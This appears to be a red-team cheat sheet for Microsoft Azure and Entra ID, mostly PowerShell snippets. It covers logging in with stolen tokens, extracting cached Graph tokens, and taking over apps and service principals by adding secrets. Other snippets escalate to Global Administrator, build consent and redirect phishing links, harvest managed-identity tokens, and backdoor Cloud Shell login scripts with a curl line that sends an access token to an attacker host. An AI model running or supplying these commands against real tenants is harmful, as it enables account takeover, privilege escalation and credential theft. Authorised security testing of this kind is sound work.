# Azure Red Teaming

Collection of resources for Azure Red Teaming.


**Table of contents**

- [Authentication](#authn)
- [User accounts](#users)
- [Groups](#groups)
- [App Registrations](#app-regs)
- [Service principals](#sps)
- [Managed Identities](#mis)
- [Storage Accounts (and Azure DevOps)](#storage-accounts)
- [Virtual Machines](#vms)


## Requirements

- Powershell 7+
- [Az PowerShell](https://learn.microsoft.com/en-us/powershell/azure/install-azps-windows?view=azps-11.2.0&tabs=powershell&pivots=windows-psgallery)
- [MS Graph PowerShell](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation?view=graph-powershell-1.0)


<a id='authn'></a>
##  Authentication

### MS Graph PowerShell

#### Interactive login
```shell
Connect-MgGraph
```

#### Device code authentication
```shell
Connect-MgGraph -UseDeviceAuthentication
```

#### Authenticate with a stolen access token

```shell
# audience: "https://graph.microsoft.com/"
$msgraphToken  = '' 
$secureToken = ConvertTo-SecureString -String $msgraphToken -AsPlainText -Force
Connect-MgGraph -AccessToken $secureToken 
```

#### Retrieve the access token after successful authentication
```shell
$InMemoryTokenCacheGetTokenData = [Microsoft.Graph.PowerShell.Authentication.Core.TokenCache.InMemoryTokenCache].GetMethod("ReadTokenData",[System.Reflection.BindingFlags]::NonPublic+[System.Reflection.BindingFlags]::Instance)
$TokenData = $InMemoryTokenCacheGetTokenData.Invoke([Microsoft.Graph.PowerShell.Authentication.GraphSession]::Instance.InMemoryTokenCache,$null)
[System.Text.Encoding]::UTF8.GetString($TokenData)
```

### Az PowerShell

#### Interactive login
```shell
Connect-AzAccount
```

#### Device code authentication
```shell
Connect-AzAccount -UseDeviceAuthentication
```

#### Authenticate with a stolen access token

```shell
# audience: "https://management.core.windows.net/"
$armToken = '' 
Connect-AzAccount -AccessToken $armToken -AccountId current
```

<a id='users'></a>
## User accounts

### Create a new user with a specific UPN

**Note**: can be useful to abuse dynamic group memberships.

```shell
$upn = ''
$password = ''
$PasswordProfile = @{
    Password = ''
}
$displayName = ''
$emailUsername = ''

New-MgUser -DisplayName $displayName -PasswordProfile $PasswordProfile -AccountEnabled $true -MailNickname $emailUsername -UserPrincipalName $upn
```

### Reset the password of a specific user

**Note**: can be used to update any property of a user object ([more info](https://learn.microsoft.com/en-us/powershell/module/microsoft.graph.users/update-mguser?view=graph-powershell-1.0)).

```shell
$upn = ''
$PasswordProfile = @{
    Password = ''
}

Update-MgUser -UPNOrObjectId $upn -PasswordProfile $PasswordProfile –Verbose
```

### Identify the Object ID of a targeted user

```shell
Get-MgUser  -All -Search '"DisplayName:<cool app>"' -ConsistencyLevel eventual
```


<a id='groups'></a>
## Groups

### Add a new member to a group

**Note**: SPs can only be added to security groups (i.e. not M365 groups)

```shell
Get-MgGroup -Search '<admin group>'
```
```shell
Get-MgUser -Search '<admin user>'
```
```shell
Get-MgServicePrincipal -All -Search '"DisplayName:<compromised app>"' -ConsistencyLevel eventual
```

```shell
$MemberOid  = ''
$groupOid = ''
$params = @{
    "@odata.id" = "https://graph.microsoft.com/v1.0/directoryObjects/{$MemberOid}"
}

New-MgGroupMemberByRef -GroupId $groupOid -BodyParameter $params
```


<a id='app-regs'></a>
## App Registrations

### Create a new secret for a targeted application object (takeover)
```shell
$appObjectid= ''

Add-MgApplicationPassword -ApplicationId $appObjectid
```

### Assign an application permission to a targted application object

**Description**: assigns the `RoleManagement.ReadWrite.Directory` permission to the targeted application object (still requires admin consent).

**Note**: 
 - identifiers for other application permissions can be found [here](https://learn.microsoft.com/en-us/graph/permissions-reference)
 - Uses Az PowerShell, as it does not seem possible with Mg PowerShell

```shell
$targetedAppObjectId = '<OID of targeted App Reg>'

$msgraphAppId = '00000003-0000-0000-c000-000000000000'
$roleManagementReadWriteDirectory = '9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8'

Add-AzADAppPermission -ObjectId $targetedAppObjectId -ApiId $msgraphAppId -PermissionId $roleManagementReadWriteDirectory -Type Role
```

### Create an admin consent link for phishing
```shell
$tid = ''
$appid = ''

Write-output "https://login.microsoftonline.com/$tid/adminconsent?client_id=$appid"
```

### Monitor for new permission grant

**Description**: monitors whether the `RoleManagement.ReadWrite.Directory` permission has been granted by an admin to the targeted application object.

```shell
function Parse-JWTtoken {
    [cmdletbinding()]
    param([Parameter(Mandatory=$true)][string]$token)
 
    # Validate as per https://tools.ietf.org/html/rfc7519
    if (!$token.Contains(".") -or !$token.StartsWith("eyJ")) { Write-Error "Invalid token" -ErrorAction Stop }
 
    # Token Payload
    $tokenPayload = $token.Split(".")[1].Replace('-', '+').Replace('_', '/')
    # Fix padding as needed, keep adding "=" until string length modulus 4 reaches 0
    while ($tokenPayload.Length % 4) { Write-Verbose "Invalid length for a Base-64 char array or string, adding ="; $tokenPayload += "=" }
    Write-Verbose "Base64 encoded (padded) payoad:"
    Write-Verbose $tokenPayload
    # Convert to Byte array
    $tokenByteArray = [System.Convert]::FromBase64String($tokenPayload)
    # Convert to string array
    $tokenArray = [System.Text.Encoding]::ASCII.GetString($tokenByteArray)
    Write-Verbose "Decoded array in JSON format:"
    Write-Verbose $tokenArray
    # Convert from JSON to PSObject
    $tokobj = $tokenArray | ConvertFrom-Json
    Write-Verbose "Decoded Payload:"
    Write-Verbose $tokobj
    
    return $tokobj
}
```
```shell
$tid = ''
$appid = ''
$password = ''

$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $appid, $securePassword

# Adapt to appropriate application permission
$permissionToConsent = 'RoleManagement.ReadWrite.Directory' 
$isConsented = $false
$retry = 120

Do {
    Clear-AzContext -Force
    Connect-AzAccount -ServicePrincipal -TenantId $tid -Credential $credential | Out-null
    $token = (Get-AzAccessToken -ResourceTypeName MSGraph).Token
    $roles = (Parse-JWTtoken $token).roles

    if ($roles -Contains $permissionToConsent) {
        $isConsented = $true
        Write-Output "Permission '$permissionToConsent' has been granted! P)"
    } else {
        $now = Get-Date -Format 'MM-dd-yyy - H:mm'
        Write-Output "${now}: No consent has been received. Retrying in $($retry / 60) minutes ..."
        Start-Sleep -s $retry
    }
} While (-not $isConsented)
```

### Create a phishing link to exploit a dangling redirect URI

```shell
$tid = ''
$appid = ''
$replyUri = ''

Write-output "https://login.microsoftonline.com/$tid/oauth2/v2.0/authorize?client_id=$appid&response_type=id_token%20token&redirect_uri=$replyUri&scope=openid%20https://graph.microsoft.com/.default&nonce=123456"
```


<a id='sps'></a>
## Service Principals

###  Authenticate with SP credentials
```shell
$tid = ''
$appid = ''
$password = ''

$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $appid, $securePassword
Connect-MgGraph -TenantId $tid -ClientSecretCredential $credential
```

### Identify the Object ID of a targeted SP

**Note**: the OID of an SP is different from the Object ID of its application registration.

```shell
Get-MgServicePrincipal -All -Search '"DisplayName:<cool app>"' -ConsistencyLevel eventual
```

### Create a new secret for a targeted SP (takeover)
```shell
$spObjectId = ''
Add-MgServicePrincipalPassword -ServicePrincipalId $spObjectId
```

### Abuse the `AppRoleAssignment.ReadWrite.All` permission

**Description**: assigns the `RoleManagement.ReadWrite.Directory` permission to the targeted SP without the need for admin consent.

**Note**: identifiers for other application permissions can be found [here](https://learn.microsoft.com/en-us/graph/permissions-reference).

```shell
$targetedSpObjectId = '<OID of targeted SP - Not App Reg>'

$msgraphSpObjectId = (Get-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $targetedSpObjectId | Where-Object -Property ResourceDisplayName -EQ -Value "Microsoft Graph" | Select-Object -First 1).ResourceId
$roleManagementReadWriteDirectory = '9e3f62cf-ca93-4989-b6ce-bf83c28f9fe8'

New-MgServicePrincipalAppRoleAssignment -ServicePrincipalId $targetedSpObjectId -ResourceId $msgraphSpObjectId -AppRoleId $roleManagementReadWriteDirectory
```

### Abuse the `RoleManagement.ReadWrite.Directory` permission

**Description**: assigns the Global Administrator role to the targeted user.

**Note**: identifiers for other Entra ID roles can be found [here](https://learn.microsoft.com/en-us/entra/identity/role-based-access-control/permissions-reference).

```shell
$targetedUserObjectId = ''
$globalAdminTemplateId = '62e90394-69f5-4237-9190-012177145e10'
$directoryScope = '/'

New-MgRoleManagementDirectoryRoleAssignment -DirectoryScopeId $directoryScope -PrincipalId $targetedUserObjectId -RoleDefinitionId $globalAdminTemplateId
```


<a id='mis'></a>
## Managed Identities

*Notes*:
- If a system-managed identity is enabled on the resource, acquiring a token for any Microsoft resource is always possible, but this does *not* mean we have access to a scope in those resources

- Granted permissions are *not* self-contained in access tokens issued by IMDS (i.e. they are tracked server side)

- The only way to enumerate permissions from inside a compromised resource is to acquire a token for common resources and enumerate permissions


### Acquire an access token for a specific resource
```shell
$resource_arm = 'https://management.azure.com/'
$resource_dataLake = 'https://datalake.azure.net'
$resource_eventGrid = 'https://eventgrid.azure.net'
$resource_graph = 'https://graph.microsoft.com'
$resource_vault = 'https://vault.azure.net'
$resource_sql = 'https://database.windows.net/'
$resource_storage = 'https://storage.azure.com'

$resource = $resource_arm

$response = Invoke-WebRequest -Uri "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=${resource}" -Headers @{Metadata="true"}
$content = $response.Content | ConvertFrom-Json
$token = $content.access_token
echo $token
```


<a id='storage-accounts'></a>
## Storage Accounts

### Abuse Contributor access to a Cloud Shell Storage Account

**Description**: after downloading the `.img` file from a Cloud Shell Storage Account, mounts the file to a Linux system and modifies its login scripts for RCE.

**Note**:
- Login-script locations for Linux and Windows are respectively:
  - `.bashrc`
  - `/home/<username>/.config/PowerShell/Microsoft.PowerShell_profile.ps1`
- The curl command works on both platforms

```shell
mount acc_username.img /mnt/
```

```shell
curl -s https://<IP_ADDRESS_OR_DOMAIN>?t="$(az account get-access-token --only-show-errors | jq -r '.accessToken')" 1>/dev/null
```


<a id='vms'></a>
## Virtual Machines

### Abuse Contributor access to a VM

```shell
$rg = ''
$vm = ''
$script = ''

Invoke-AzureRmVMRunCommand -ResourceGroupName $rg -VMName $vm -CommandId RunPowerShellScript -ScriptPath $script
```
